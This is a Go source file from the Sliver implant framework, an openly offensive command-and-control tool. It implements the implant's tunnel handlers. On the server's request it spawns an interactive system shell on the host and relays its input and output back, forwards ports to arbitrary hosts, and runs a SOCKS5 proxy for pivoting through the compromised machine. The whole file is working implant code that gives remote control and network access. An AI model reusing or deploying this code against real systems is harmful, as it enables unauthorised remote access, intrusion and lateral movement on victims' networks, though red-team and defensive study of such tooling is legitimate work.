package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io"
	"net"
	"strconv"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/shell"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

var (
	tunnelHandlers = map[uint32]TunnelHandler{
		sliverpb.MsgShellReq:   shellReqHandler,
		sliverpb.MsgPortfwdReq: portfwdReqHandler,
		sliverpb.MsgSocksData:  socksReqHandler,

		sliverpb.MsgTunnelData:  tunnelDataHandler,
		sliverpb.MsgTunnelClose: tunnelCloseHandler,
	}

	// TunnelID -> Sequence Number -> Data
	tunnelDataCache = map[uint64]map[uint64]*sliverpb.TunnelData{}

	//socksDataCache = map[uint64]*matrixpb.Socks{}
	socksDataCache = map[uint64]*SocksDataChan{}
)

type SocksDataChan struct {
	Username string
	Password string
	Status   bool
	DataChan chan []byte
	Sequence uint64
	TunnelID uint64
	Conn     *transports.Connection
}

// GetTunnelHandlers - Returns a map of tunnel handlers
func GetTunnelHandlers() map[uint32]TunnelHandler {
	// {{if .Config.Debug}}
	log.Printf("[tunnel] Tunnel handlers %v", tunnelHandlers)
	// {{end}}
	return tunnelHandlers
}

func tunnelCloseHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	tunnelClose := &sliverpb.TunnelData{
		Closed: true,
	}
	proto.Unmarshal(envelope.Data, tunnelClose)
	tunnel := connection.Tunnel(tunnelClose.TunnelID)
	if tunnel != nil {
		// {{if .Config.Debug}}
		log.Printf("[tunnel] Closing tunnel with id %d", tunnel.ID)
		// {{end}}
		connection.RemoveTunnel(tunnel.ID)
		tunnel.Reader.Close()
		tunnel.Writer.Close()
		delete(tunnelDataCache, tunnel.ID)
	}
}

func tunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	tunnelData := &sliverpb.TunnelData{}
	proto.Unmarshal(envelope.Data, tunnelData)
	tunnel := connection.Tunnel(tunnelData.TunnelID)
	if tunnel != nil {

		if _, ok := tunnelDataCache[tunnelData.TunnelID]; !ok {
			tunnelDataCache[tunnelData.TunnelID] = map[uint64]*sliverpb.TunnelData{}
		}

		// Since we have no guarantees that we will receive tunnel data in the correct order, we need
		// to ensure we write the data back to the reader in the correct order. The server will ensure
		// that TunnelData protobuf objects are numbered in the correct order using the Sequence property.
		// Similarly we ensure that any data we write-back to the server is also numbered correctly. To
		// reassemble the data, we just dump it into the cache and then advance the writer until we no longer
		// have sequential data. So we can receive `n` number of incorrectly ordered Protobuf objects and
		// correctly write them back to the reader.

		// {{if .Config.Debug}}
		log.Printf("[tunnel] Cache tunnel %d (seq: %d)", tunnel.ID, tunnelData.Sequence)
		// {{end}}

		//Added a thread lock here because the incrementing of the ReadSequence, adding/deleting things from a shared cache,
		//and then making decisions based on the current size of the cache by multiple threads can cause race conditions errors
		var l sync.Mutex
		l.Lock()
		tunnelDataCache[tunnel.ID][tunnelData.Sequence] = tunnelData

		// NOTE: The read/write semantics can be a little mind boggling, just remember we're reading
		// from the server and writing to the tunnel's reader (e.g. stdout), so that's why ReadSequence
		// is used here whereas WriteSequence is used for data written back to the server

		// Go through cache and write all sequential data to the reader
		cache := tunnelDataCache[tunnel.ID]
		for recv, ok := cache[tunnel.ReadSequence]; ok; recv, ok = cache[tunnel.ReadSequence] {
			// {{if .Config.Debug}}
			log.Printf("[tunnel] Write %d bytes to tunnel %d (read seq: %d)", len(recv.Data), recv.TunnelID, recv.Sequence)
			// {{end}}
			tunnel.Writer.Write(recv.Data)

			// Delete the entry we just wrote from the cache
			delete(cache, tunnel.ReadSequence)
			tunnel.ReadSequence++ // Increment sequence counter
		}

		//If cache is building up it probably means a msg was lost and the server is currently hung waiting for it.
		//Send a Resend packet to have the msg resent from the cache
		if len(cache) > 3 {
			data, err := proto.Marshal(&sliverpb.TunnelData{
				Sequence: tunnel.WriteSequence, // The tunnel write sequence
				Ack:      tunnel.ReadSequence,
				Resend:   true,
				TunnelID: tunnel.ID,
				Data:     []byte{},
			})
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[shell] Failed to marshal protobuf %s", err)
				// {{end}}
			} else {
				// {{if .Config.Debug}}
				log.Printf("[tunnel] Requesting resend of tunnelData seq: %d", tunnel.ReadSequence)
				// {{end}}
				connection.RequestResend(data)
			}
		}
		//Unlock
		l.Unlock()

	} else {
		// {{if .Config.Debug}}
		log.Printf("[tunnel] Received data for nil tunnel %d", tunnelData.TunnelID)
		// {{end}}
	}
}

// tunnelWriter - Sends data back to the server based on data read()
// I know the reader/writer stuff is a little hard to keep track of
type tunnelWriter struct {
	tun  *transports.Tunnel
	conn *transports.Connection
}

func (tw tunnelWriter) Write(data []byte) (int, error) {
	n := len(data)
	data, err := proto.Marshal(&sliverpb.TunnelData{
		Sequence: tw.tun.WriteSequence, // The tunnel write sequence
		Ack:      tw.tun.ReadSequence,
		TunnelID: tw.tun.ID,
		Data:     data,
	})
	// {{if .Config.Debug}}
	log.Printf("[tunnelWriter] Write %d bytes (write seq: %d) ack: %d", n, tw.tun.WriteSequence, tw.tun.ReadSequence)
	// {{end}}
	tw.tun.WriteSequence++ // Increment write sequence
	tw.conn.Send <- &sliverpb.Envelope{
		Type: sliverpb.MsgTunnelData,
		Data: data,
	}
	return n, err
}

func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {

	shellReq := &sliverpb.ShellReq{}
	err := proto.Unmarshal(envelope.Data, shellReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] Failed to unmarshal protobuf %s", err)
		// {{end}}
		return
	}

	shellPath := shell.GetSystemShellPath(shellReq.Path)
	systemShell := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY)
	if systemShell == nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] Failed to get system shell")
		// {{end}}
		return
	}
	go systemShell.StartAndWait()
	// Wait for the process to actually spawn
	for {
		if systemShell.Command.Process == nil {
			// {{if .Config.Debug}}
			log.Printf("[shell] Waiting for process to spawn ...")
			// {{end}}
			time.Sleep(time.Second)
		} else {
			break
		}
	}
	tunnel := &transports.Tunnel{
		ID:     shellReq.TunnelID,
		Reader: systemShell.Stdout,
		Writer: systemShell.Stdin,
	}
	connection.AddTunnel(tunnel)

	shellResp, _ := proto.Marshal(&sliverpb.Shell{
		Pid:      uint32(systemShell.Command.Process.Pid),
		Path:     shellReq.Path,
		TunnelID: shellReq.TunnelID,
	})
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.ID,
		Data: shellResp,
	}

	// Cleanup function with arguments
	cleanup := func(reason string) {
		// {{if .Config.Debug}}
		log.Printf("[shell] Closing tunnel %d (%s)", tunnel.ID, reason)
		// {{end}}
		connection.RemoveTunnel(tunnel.ID)
		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
			Closed:   true,
			TunnelID: tunnel.ID,
		})
		connection.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgTunnelClose,
			Data: tunnelClose,
		}
	}

	go func() {
		for {
			tWriter := tunnelWriter{
				tun:  tunnel,
				conn: connection,
			}
			_, err := io.Copy(tWriter, tunnel.Reader)
			if systemShell.Command.ProcessState != nil {
				if systemShell.Command.ProcessState.Exited() {
					cleanup("process terminated")
					return
				}
			}
			if err == io.EOF {
				cleanup("EOF")
				return
			}
		}
	}()

	// {{if .Config.Debug}}
	log.Printf("[shell] Started shell with tunnel ID %d", tunnel.ID)
	// {{end}}

}

func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	portfwdReq := &sliverpb.PortfwdReq{}
	err := proto.Unmarshal(envelope.Data, portfwdReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Failed to unmarshal protobuf %s", err)
		// {{end}}
		return
	}

	var defaultDialer = new(net.Dialer)

	// TODO: Configurable context
	remoteAddress := fmt.Sprintf("%s:%d", portfwdReq.Host, portfwdReq.Port)
	// {{if .Config.Debug}}
	log.Printf("[portfwd] Dialing -> %s", remoteAddress)
	// {{end}}
	dst, err := defaultDialer.DialContext(context.Background(), "tcp", remoteAddress)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Failed to dial remote address %s", err)
		// {{end}}
		return
	}
	if conn, ok := dst.(*net.TCPConn); ok {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Configuring keep alive")
		// {{end}}
		conn.SetKeepAlive(true)
		// TODO: Make KeepAlive configurable
		conn.SetKeepAlivePeriod(30 * time.Second)
	}

	// Add tunnel
	tunnel := &transports.Tunnel{
		ID:     portfwdReq.TunnelID,
		Reader: dst,
		Writer: dst,
	}
	connection.AddTunnel(tunnel)

	// Send portfwd response
	portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
		Port:     portfwdReq.Port,
		Host:     portfwdReq.Host,
		Protocol: sliverpb.PortFwdProtoTCP,
		TunnelID: portfwdReq.TunnelID,
	})
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.ID,
		Data: portfwdResp,
	}

	cleanup := func(reason error) {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
		// {{end}}
		connection.RemoveTunnel(tunnel.ID)
		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
			Closed:   true,
			TunnelID: tunnel.ID,
		})
		connection.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgTunnelClose,
			Data: tunnelClose,
		}
	}

	go func() {
		tWriter := tunnelWriter{
			tun:  tunnel,
			conn: connection,
		}
		_, err := io.Copy(tWriter, tunnel.Reader)
		cleanup(err)
	}()
}

type socksTunnelPool struct {
	tunnels    map[uint64]chan []byte
	readMutex  *sync.Mutex
	writeMutex *sync.Mutex
	Sequence   map[uint64]uint64
}

var socksTunnels = socksTunnelPool{
	tunnels:    map[uint64]chan []byte{},
	readMutex:  &sync.Mutex{},
	writeMutex: &sync.Mutex{},
	Sequence:   map[uint64]uint64{},
}

func getSocksChan(tunnelID uint64, connection *transports.Connection) (*SocksDataChan, bool) {
	if dataChan, ok := socksDataCache[tunnelID]; ok {
		return dataChan, true
	} else {
		socksDataCache[tunnelID] = new(SocksDataChan)
		socksDataCache[tunnelID].DataChan = make(chan []byte, 5)
		socksDataCache[tunnelID].Username = ""
		socksDataCache[tunnelID].Password = ""
		socksDataCache[tunnelID].Conn = connection
		socksDataCache[tunnelID].Sequence = 0
		socksDataCache[tunnelID].TunnelID = tunnelID
		socksDataCache[tunnelID].Status = true
		// {{if .Config.Debug}}
		log.Printf("[socks] Server to agent Tunnel (%d) %#v \n", tunnelID, socksDataCache[tunnelID])
		// {{end}}
		return socksDataCache[tunnelID], false
	}
}
func socksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	socksData := &sliverpb.SocksData{}
	err := proto.Unmarshal(envelope.Data, socksData)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[socks] Failed to unmarshal protobuf %s", err)
		// {{end}}
		return
	}
	if socksData.Data == nil {
		return
	}

	// data -> chan
	socksChan, SeqExist := getSocksChan(socksData.TunnelID, connection)
	socksChan.DataChan <- socksData.Data

	// if not exist
	if !SeqExist {
		go socksChan.handleSocks()
	}
}

type Setting struct {
	method       string
	tcpConnected bool
	success      bool
	tcpConn      net.Conn
}

func (socks *SocksDataChan) handleSocks() {
	setting := new(Setting)
	//data, ok := <-dataChan
	for {
		if !setting.tcpConnected {
			data, ok := <-socks.DataChan
			if !ok {
				return
			}
			// {{if .Config.Debug}}
			log.Printf("[socks] Server to agent Tunnel (%d) buildConn DataLength %d ,Seq %d\n", socks.TunnelID, len(data), socks.Sequence)
			// {{end}}
			// udp or tcp
			socks.buildConn(setting, data)
			//log.Printf("setting : %#v", setting)
			if !setting.tcpConnected {
				return
			}
		} else if setting.tcpConnected { //All done!
			// {{if .Config.Debug}}
			log.Printf("[socks] Server to agent Tunnel (%d) proxyS2CTCP ,Seq %d\n", socks.TunnelID, socks.Sequence)
			// {{end}}
			go socks.proxyC2STCP(setting.tcpConn)
			socks.proxyS2CTCP(setting.tcpConn)
			return
		} else {
			return
		}
	}
}

func (socks *SocksDataChan) buildConn(setting *Setting, data []byte) {

	failMess := &sliverpb.SocksData{
		Sequence: socks.Sequence,
		TunnelID: socks.TunnelID,
		DataLen:  uint64(len([]byte{0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})),
		Data:     []byte{0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
	}

	length := len(data)

	if length <= 2 {
		//{{if .Config.Debug}}
		log.Printf("[tunnel] buildConn error length TunnelID %v", socks.Sequence)
		// {{end}}
		marshal, _ := proto.Marshal(failMess)
		socks.Conn.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgSocksData,
			Data: marshal,
		}
		return
	}

	if data[0] == 0x05 {
		switch data[1] {
		case 0x01:
			socks.tcpConnect(setting, data, length)
		case 0x02:
			socks.tcpBind(setting, data, length)
		case 0x03:
			socks.udpAssociate(setting, data, length)
		default:
			marshal, _ := proto.Marshal(failMess)
			socks.Conn.Send <- &sliverpb.Envelope{
				Type: sliverpb.MsgSocksData,
				Data: marshal,
			}
		}
	}
}

func Int2Str(num int) string {
	b := strconv.Itoa(num)
	return b
}

// TCPConnect
func (socks *SocksDataChan) tcpConnect(setting *Setting, data []byte, length int) {
	var host string
	var err error

	failMess := &sliverpb.SocksData{
		Sequence: socks.Sequence,
		TunnelID: socks.TunnelID,
		DataLen:  uint64(len([]byte{0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})),
		Data:     []byte{0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
	}

	succMess := &sliverpb.SocksData{
		Sequence: socks.Sequence,
		TunnelID: socks.TunnelID,
		DataLen:  uint64(len([]byte{0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})),
		Data:     []byte{0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
	}

	defer func() {
		if r := recover(); r != nil {
			setting.tcpConnected = false
		}
	}()

	switch data[3] {
	case 0x01:
		host = net.IPv4(data[4], data[5], data[6], data[7]).String()
	case 0x03:
		host = string(data[5 : length-2])
	case 0x04:
		host = net.IP{data[4], data[5], data[6], data[7],
			data[8], data[9], data[10], data[11], data[12],
			data[13], data[14], data[15], data[16], data[17],
			data[18], data[19]}.String()
	default:
		marshal, _ := proto.Marshal(failMess)
		socks.Conn.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgSocksData,
			Data: marshal,
		}
		setting.tcpConnected = false
		return
	}

	port := Int2Str(int(data[length-2])<<8 | int(data[length-1]))

	setting.tcpConn, err = net.DialTimeout("tcp", net.JoinHostPort(host, port), 1*time.Minute)

	if err != nil {
		marshal, _ := proto.Marshal(failMess)
		socks.Conn.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgSocksData,
			Data: marshal,
		}
		setting.tcpConnected = false
		return
	}

	if !socks.Status { // if admin has already send fin,then close the conn and set setting.tcpConnected -> false
		setting.tcpConn.Close()
		//{{if .Config.Debug}}
		log.Printf("[tunnel] buildConn error Status TunnelID %v", socks.Sequence)
		// {{end}}
		marshal, _ := proto.Marshal(failMess)
		socks.Conn.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgSocksData,
			Data: marshal,
		}
		setting.tcpConnected = false
		return
	}

	marshal, _ := proto.Marshal(succMess)
	socks.Conn.Send <- &sliverpb.Envelope{
		Type: sliverpb.MsgSocksData,
		Data: marshal,
	}
	setting.tcpConnected = true
}

// TCPBind TCPBind方式
func (socks *SocksDataChan) tcpBind(setting *Setting, data []byte, length int) {
	setting.tcpConnected = false
}

// Based on rfc1928,agent must send message strictly
func (socks *SocksDataChan) udpAssociate(setting *Setting, data []byte, length int) {
	setting.tcpConnected = false
}

func (socks *SocksDataChan) proxyC2STCP(conn net.Conn) {
	for {
		data, ok := <-socks.DataChan
		if !ok { // no need to send FIN actively
			return
		}
		// {{if .Config.Debug}}
		log.Printf("[socks] Server to agent Tunnel (%d) ,Seq %d  Data Size %d \n", socks.TunnelID, socks.Sequence, len(data))
		// {{end}}
		conn.Write(data)
	}
}

func (socks *SocksDataChan) proxyS2CTCP(conn net.Conn) {
	buffer := make([]byte, 20480)
	for {
		socks.Sequence++
		dataMess := &sliverpb.SocksData{
			TunnelID: socks.TunnelID,
			Sequence: socks.Sequence,
		}
		length, err := conn.Read(buffer)
		// {{if .Config.Debug}}
		log.Printf("[socks] agent to Server Tunnel (%d) ,Seq %d Data Size %d \n", socks.TunnelID, socks.Sequence, length)
		// {{end}}
		if err != nil {
			if err == io.EOF {
				conn.Close() // close conn immediately
				dataMess.CloseConn = true
				marshal, _ := proto.Marshal(dataMess)
				if socks.Conn.IsOpen {
					socks.Conn.Send <- &sliverpb.Envelope{
						Type: sliverpb.MsgSocksData,
						Data: marshal,
					}
				}
				return
			}
			// {{if .Config.Debug}}
			log.Printf("[socks] agent to Server Tunnel (%d) ,error : %s \n", socks.TunnelID, err.Error())
			// {{end}}
			socks.Sequence--
			continue
		}
		dataMess.Data = buffer[:length]
		dataMess.DataLen = uint64(length)
		marshal, _ := proto.Marshal(dataMess)
		socks.Conn.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgSocksData,
			Data: marshal,
		}

	}
}
